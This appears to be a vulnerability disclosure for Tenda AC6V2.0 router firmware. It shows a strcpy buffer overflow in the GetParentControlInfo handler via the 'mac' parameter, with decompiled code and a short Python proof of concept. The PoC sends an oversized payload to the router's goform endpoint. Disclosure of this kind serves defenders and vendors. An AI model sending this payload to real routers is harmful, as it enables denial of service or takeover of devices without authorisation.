# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "GetParentControlInfo"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/102855)

In the `GetParentControlInfo` function, the user-supplied MAC address is obtained via `websGetVar`. However, this input is not validated, and it's directly copied into `pc_info->mac_addr` using `strcpy`. The allocated space for `pc_info` via `malloc` is only `0x254` bytes. Consequently, this leads to a **buffer overflow**.

```c
mac_addr = websGetVar(wp, "mac", byte_519A28);//get mac value
pc_info = (parent_control_info *)malloc(0x254u);
memset(pc_info, 0, sizeof(parent_control_info));
strcpy((char *)pc_info->mac_addr, mac_addr);//overflow
```

![image-20250614161657528](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614161657528.png)

poc

```python
import requests
def send_payload(url, payload):
    params={'mac':payload}
    response = requests.get(url, params=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2048+b"\xef\xbe\xad\xde"
url="http://192.168.1.1/goform/GetParentControlInfo"
send_payload(url, payload)   
```

![image-20250614171717338](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614171717338.png)

